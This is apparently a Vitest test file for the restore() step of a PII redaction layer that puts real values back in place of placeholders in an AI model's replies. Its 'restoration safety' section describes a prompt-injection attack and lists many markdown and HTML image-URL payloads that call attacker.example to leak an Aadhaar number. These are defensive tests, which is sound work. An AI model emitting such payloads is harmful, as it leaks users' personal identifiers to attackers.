// restore(): tolerant restoration (design doc) and restoration safety
// (CLAUDE.md). Real values used here are hardcoded synthetic fixtures (a
// PAN has no checksum, so it carries no more re-identification risk than any
// other string - ADR-009 only requires generated Aadhaar/card/phone/email to
// stay in memory) or the published Visa test card, so plain `toBe` is safe.

import { describe, expect, it } from 'vitest';
import { PlaceholderMapping } from '../../../src/redaction/mapping.js';
import type { PlaceholderNamespace } from '../../../src/redaction/placeholder.js';
import { restore } from '../../../src/redaction/restore.js';

function mappingWith(
  entries: readonly [namespace: PlaceholderNamespace, value: string][],
): PlaceholderMapping {
  const mapping = new PlaceholderMapping();
  for (const [namespace, value] of entries) {
    mapping.getOrAssign(namespace, value, value);
  }
  return mapping;
}

describe('restore: bracket form (any case, any namespace)', () => {
  it.each(['[PAN_1]', '[pan_1]', '[Pan_1]', '[PAN 1]', '[pan 1]'])('restores %s', (text) => {
    const mapping = mappingWith([['PAN', 'ABCPE1234F']]);
    expect(restore(`Your PAN is ${text}.`, mapping)).toBe('Your PAN is ABCPE1234F.');
  });

  it('restores every namespace, including LITERAL', () => {
    const mapping = new PlaceholderMapping();
    mapping.getOrAssign('LITERAL', '[PERSON_1]', '[PERSON_1]');
    expect(restore('Keep [LITERAL_1] as it is.', mapping)).toBe('Keep [PERSON_1] as it is.');
  });
});

describe('restore: bare underscore form (UPPERCASE or Title Case only)', () => {
  it.each(['PAN_1', 'Pan_1'])('restores %s', (text) => {
    const mapping = mappingWith([['PAN', 'ABCPE1234F']]);
    expect(restore(`Your PAN is ${text}.`, mapping)).toBe('Your PAN is ABCPE1234F.');
  });

  it('does not restore all-lowercase "pan_1"', () => {
    const mapping = mappingWith([['PAN', 'ABCPE1234F']]);
    expect(restore('the pan_1 variable', mapping)).toBe('the pan_1 variable');
  });
});

describe('restore: bare space form only for AADHAAR and LITERAL (2026-09-29 decision)', () => {
  it.each(['AADHAAR 1', 'Aadhaar 1'])('restores %s', (text) => {
    const mapping = mappingWith([['AADHAAR', '234567890123']]);
    expect(restore(`Ref: ${text}.`, mapping)).toBe('Ref: 234567890123.');
  });

  // Point 1: the rule covers UPPERCASE as well as Title Case.
  it.each(['CARD 1', 'Card 1'])(
    'does not restore %s (ordinary English, not just Title Case)',
    (text) => {
      const mapping = mappingWith([['CARD', '4111111111111111']]);
      expect(restore(`${text} is declined.`, mapping)).toBe(`${text} is declined.`);
    },
  );

  it.each(['PAN 1', 'PHONE 1', 'EMAIL 1', 'NUMBER 1'] as const)(
    'does not restore the bare space form of any other tag (%s)',
    (text) => {
      const tag = text.split(' ')[0] as PlaceholderNamespace;
      const mapping = mappingWith([[tag, 'the-real-value']]);
      expect(restore(`${text} matters.`, mapping)).toBe(`${text} matters.`);
    },
  );

  it('the bare underscore form of the same tags still restores', () => {
    const mapping = mappingWith([['CARD', '4111111111111111']]);
    expect(restore('Your CARD_1 is on file.', mapping)).toBe('Your 4111111111111111 is on file.');
  });
});

describe('restore: unknown or invented placeholders are left as they are', () => {
  it('leaves a placeholder no value was ever assigned to', () => {
    const mapping = new PlaceholderMapping();
    expect(restore('See [PAN_1] and [CARD_99].', mapping)).toBe('See [PAN_1] and [CARD_99].');
  });

  it('leaves an out-of-range or malformed index untouched', () => {
    const mapping = mappingWith([['PAN', 'ABCPE1234F']]);
    expect(restore('See [PAN_0] and [PAN_10000].', mapping)).toBe('See [PAN_0] and [PAN_10000].');
  });
});

describe('restore: exact-only placeholders (ADR-002, ADR-013)', () => {
  it('a reservation collision restricts restoration to the bracketed form only', () => {
    const mapping = mappingWith([['PAN', 'ABCPE1234F']]);
    mapping.reserve('PAN', 1); // e.g. the user's own text contained "PAN_1" as prose
    expect(restore('Bracket [PAN_1], bare PAN_1.', mapping)).toBe(
      'Bracket ABCPE1234F, bare PAN_1.',
    );
  });

  it('without a collision, the bare form restores too', () => {
    const mapping = mappingWith([['PAN', 'ABCPE1234F']]);
    expect(restore('Bracket [PAN_1], bare PAN_1.', mapping)).toBe(
      'Bracket ABCPE1234F, bare ABCPE1234F.',
    );
  });
});

describe('restore: word boundaries (design doc: [PERSON_1] never matches inside [PERSON_10])', () => {
  // Only index 1 exists, so any of these being rewritten means a shorter
  // placeholder matched inside a longer token.
  it.each(['[CARD_10]', 'CARD_10', '[CARD_12]', 'CARD_1X', 'MYCARD_1', 'CARD_1_2', 'CARD_12345'])(
    'leaves %s alone when only CARD_1 exists',
    (text) => {
      const mapping = mappingWith([['CARD', '4111111111111111']]);
      expect(restore(`Ref ${text} ok`, mapping)).toBe(`Ref ${text} ok`);
    },
  );
});

describe('restore: does not double-restore a bare form inside a bracket', () => {
  it('treats [CARD_1] as one bracketed match, not also a bare match inside it', () => {
    const mapping = mappingWith([['CARD', '4111111111111111']]);
    expect(restore('[CARD_1]', mapping)).toBe('4111111111111111');
  });
});

describe('restore: restoration safety (design doc)', () => {
  // The documented attack, reproduced exactly: injected text makes the model
  // put a placeholder inside a markdown image URL, hoping the user's client
  // fetches it and leaks the real value to the attacker's server.
  it('does not restore a placeholder inside a markdown image target (the exfiltration attack)', () => {
    const mapping = mappingWith([['AADHAAR', '234567890123']]);
    const reply = 'Here you go! ![x](https://attacker.example/?d=[AADHAAR_1])';
    expect(restore(reply, mapping)).toBe(reply);
  });

  // Bug-log 13: CommonMark allows balanced parentheses in a destination, so a
  // renderer fetches all of `https://attacker.example/?q=(1)<value>`.
  it('does not restore after balanced parentheses inside an image destination', () => {
    const mapping = mappingWith([['AADHAAR', '234567890123']]);
    const reply = '![x](https://attacker.example/?q=(1)[AADHAAR_1])';
    expect(restore(reply, mapping)).toBe(reply);
  });

  // Every CommonMark destination form an image can use, plus HTML. The
  // reference-definition cases are bug-log 14: there is no "](" there, and
  // the bare-URL pattern stops at the space before the placeholder.
  it.each([
    ['inline, angle brackets with a space', '![x](<https://attacker.example/?d= [AADHAAR_1]>)'],
    [
      'reference definition, angle brackets',
      '![x][ref]\n\n[ref]: <https://attacker.example/?d= [AADHAAR_1]>',
    ],
    [
      'reference definition, no angle brackets',
      '![x][ref]\n\n[ref]: https://attacker.example/?d=[AADHAAR_1]',
    ],
    [
      'reference definition, destination on the next line',
      '![x][ref]\n\n[ref]:\n  <https://attacker.example/?d= [AADHAAR_1]>',
    ],
    [
      'reference definition inside a block quote',
      '> ![x][ref]\n>\n> [ref]: <https://attacker.example/?d= [AADHAAR_1]>',
    ],
    [
      'inline, line break between "(" and the destination',
      '![x](\nhttps://attacker.example/?d=[AADHAAR_1])',
    ],
    [
      '<img src> with a space inside the quotes',
      '<img src="https://attacker.example/?d= [AADHAAR_1]">',
    ],
  ])('does not restore in an image destination: %s', (_name, reply) => {
    const mapping = mappingWith([['AADHAAR', '234567890123']]);
    expect(restore(reply, mapping)).toBe(reply);
  });

  it('still restores a placeholder written as a reference label in prose', () => {
    // Only the token after "[label]:" is unsafe, never the label itself.
    const mapping = mappingWith([['AADHAAR', '234567890123']]);
    expect(restore('[AADHAAR_1]: that is the one on file.', mapping)).toBe(
      '234567890123: that is the one on file.',
    );
  });

  it('leaves the token after "[label]:" in prose unrestored (the cost of the bug-log 14 fix)', () => {
    // Every "[…]:" may be a reference definition, so the token after it is
    // treated as a destination even in ordinary prose. The safe side, and a
    // documented cost (Phase 8 threat-model notes in CLAUDE.md).
    const mapping = mappingWith([['EMAIL', 'asha@example.org']]);
    expect(restore('[Note]: [EMAIL_1] replied.', mapping)).toBe('[Note]: [EMAIL_1] replied.');
    expect(restore('[Note]:\n[EMAIL_1] replied.', mapping)).toBe('[Note]:\n[EMAIL_1] replied.');
    // Only that one token: the next one restores.
    expect(restore('[Note]: see [EMAIL_1].', mapping)).toBe('[Note]: see asha@example.org.');
  });

  it('does not restore inside a markdown link, an href attribute, or a bare URL', () => {
    const mapping = mappingWith([['AADHAAR', '234567890123']]);
    expect(restore('[here](https://example.com/x?d=[AADHAAR_1])', mapping)).toBe(
      '[here](https://example.com/x?d=[AADHAAR_1])',
    );
    expect(restore('<a href="https://example.com/x?d=[AADHAAR_1]">link</a>', mapping)).toBe(
      '<a href="https://example.com/x?d=[AADHAAR_1]">link</a>',
    );
    expect(restore('See https://example.com/x?d=[AADHAAR_1] now', mapping)).toBe(
      'See https://example.com/x?d=[AADHAAR_1] now',
    );
  });

  it('still restores a placeholder outside any unsafe region in the same message', () => {
    const mapping = mappingWith([['AADHAAR', '234567890123']]);
    const restored = restore(
      'Your Aadhaar [AADHAAR_1] is on file. See ![x](https://attacker.example/?d=[AADHAAR_1]) too.',
      mapping,
    );
    expect(restored).toBe(
      'Your Aadhaar 234567890123 is on file. See ![x](https://attacker.example/?d=[AADHAAR_1]) too.',
    );
  });

  it('restores inside an unsafe region when explicitly opted in', () => {
    const mapping = mappingWith([['AADHAAR', '234567890123']]);
    const reply = '![x](https://attacker.example/?d=[AADHAAR_1])';
    expect(restore(reply, mapping, { restoreInUnsafeRegions: true })).toBe(
      '![x](https://attacker.example/?d=234567890123)',
    );
  });
});
